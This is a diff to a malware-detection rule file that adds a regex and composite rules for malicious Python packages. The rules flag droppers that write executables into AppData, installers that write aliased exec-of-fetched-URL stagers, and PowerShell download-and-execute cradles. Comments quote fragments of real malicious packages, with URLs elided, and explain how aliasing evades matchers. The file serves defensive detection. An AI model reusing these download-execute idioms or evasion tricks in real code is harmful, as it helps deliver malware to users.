@@ -40,6 +40,18 @@ traits:
     if:
       type: text
       substr: "evo-hook-drain-"
+
+  # The written-stager fragment consumed by python-installer-writes-remote-exec-stager:
+  # an exec binding assigned then invoked on the response of a URL-bearing call.
+  - id: python-written-remote-exec-stager-literal
+    desc: Written stager execs a fetched URL response
+    crit: component
+    conf: 0.92
+    platforms: [unix, windows]
+    if:
+      type: text
+      regex: '=\s*exec\b[^\n]{0,24};[^\n]{0,24}\w+\s*\(\s*\w+\s*\(\s*["'']https?://'
+
 composite_rules:
   - id: official-llamafile-runner-marker
     desc: Official llamafile model runner marker
@@ -127,3 +139,72 @@ composite_rules:
       - id: micro-behaviors/fs/file/open::binary-write-mode
       - id: micro-behaviors/process/create/subprocess::java-jar-argv
       - id: micro-behaviors/communications/http/services/google::google-drive-direct-download-url
+
+# A Python script that drops a downloaded executable into the user's AppData
+# and launches it through a raw Win32 call. The AppData landing zone plus the
+# ctypes WinExec/ShellExecute launch is the dropper idiom -- a legitimate
+# installer uses the user's package manager or Program Files, not a hidden
+# per-user directory and a syscall.
+#
+# Worked example: the `discconnect` PyPI package, whose install hook fetches
+# `Driver.exe` from filetransfer.io into %LOCALAPPDATA% and WinExecs it.
+  - id: python-download-appdata-exe-launch
+    desc: Downloaded exe lands in AppData and WinExecs
+    crit: hostile
+    conf: 0.97
+    all:
+      - id: micro-behaviors/communications/http/lib/urllib::urllib-download-to-binary-output
+      - id: micro-behaviors/fs/path/application/executable::appdata-exe-path
+      - id: micro-behaviors/process/create/exec::python-ctypes-win32-exec
+
+# An installer that writes a stager whose body is an aliased
+# exec(urlopen('https://...').read()) chain, then hands it to the interpreter.
+# The stager text lives inside the installer as a written literal, so the
+# fetch and the exec never appear as real calls -- only as the payload the
+# installer drops. Aliasing both primitives (urlopen as _ajasaa, exec as
+# _xzzzx) is what keeps every dotted matcher blind.
+#
+# Worked example: `libsock4`, whose setup.py writes
+# `_xzzzx=exec; _xzzzx(_ajasaa('https://pub-...r2.dev/...').read())` to a
+# NamedTemporaryFile and starts it with pythonw.
+  - id: python-installer-writes-remote-exec-stager
+    desc: Installer writes stager executing remote content
+    crit: hostile
+    conf: 0.96
+    all:
+      - id: python-written-remote-exec-stager-literal
+      - id: micro-behaviors/data/control-flow/module-exec::module-level-side-effect-call
+
+# A Python file that builds a PowerShell download-execute one-liner (IWR to
+# OutFile, then Invoke-Expression) and hands it to os.system. Every PowerShell
+# dropper rule is written for PowerShell files; this one sees the cradle as a
+# string inside its host language, which is how setup.py droppers ship it.
+#
+# Worked example: `derkpy`, whose setup.py runs
+# `powershell Invoke-WebRequest -Uri ".../Oxzy.exe" -OutFile ~/WindowsCache.exe;
+#  Invoke-Expression ~/WindowsCache.exe` through os.system at module scope.
+  - id: python-os-system-powershell-download-cradle
+    desc: os.system runs PowerShell download cradle
+    crit: hostile
+    conf: 0.97
+    all:
+      - id: micro-behaviors/communications/http/download/helper::python-string-powershell-webrequest
+      - id: micro-behaviors/process/create/system::python-os-system-text
+      - id: micro-behaviors/communications/http/download/url::executable-url-reference-embedded
+
+# A Python package that shells the download job out to PowerShell: curl.exe
+# fetches a remote executable to disk and Start-Process runs it, all inside a
+# subprocess argument list. The pure-Python droppers are covered above; this
+# is the delegation spelling, where the fetch and the launch happen inside a
+# child powershell process the parent never has to implement.
+#
+# Worked example: `antibyfron`, whose module runs
+# ["powershell","-Command","curl.exe -L .../zwerve.exe -o ...; Start-Process ..."].
+  - id: python-shell-powershell-curl-exe-download
+    desc: Python delegates exe download to PowerShell
+    crit: hostile
+    conf: 0.96
+    all:
+      - id: micro-behaviors/communications/http/download/url::executable-url-reference-embedded
+      - id: micro-behaviors/communications/http/download/cli::fetch-output-flag-embedded-command
+      - id: micro-behaviors/process/create/subprocess::process-execution
